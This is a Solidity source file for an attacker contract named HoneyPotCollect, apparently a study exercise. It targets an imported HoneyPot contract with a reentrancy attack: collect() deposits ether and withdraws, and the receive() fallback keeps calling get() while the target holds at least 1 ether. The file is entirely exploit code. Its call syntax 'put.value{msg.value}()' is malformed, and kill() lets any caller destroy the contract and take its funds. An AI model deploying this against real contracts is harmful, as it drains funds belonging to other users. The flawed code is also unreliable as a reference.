//SPDX-License-Identifier: MIT
pragma solidity >=0.4.22 <0.9.0;
import "./Contract.sol";

contract HoneyPotCollect {
    HoneyPot public honeypot;
    uint256 public Balances;
    uint256[] public balances;

    constructor(address _honeypot) public {
        honeypot = HoneyPot(_honeypot);
    }

    function kill() public {
        selfdestruct(payable(msg.sender));
    }

    function collect() public payable {
        honeypot.put.value{msg.value}();
        honeypot.get();
    }

    function Balance() public view returns (uint256) {
        return address(this).balance;
    }

    receive () external payable {
        if (address(honeypot).balance >= 1 ether) {
            balances.push(address(this).balance);
            honeypot.get();
            Balances = (address(honeypot).balance);
        }
    }
}
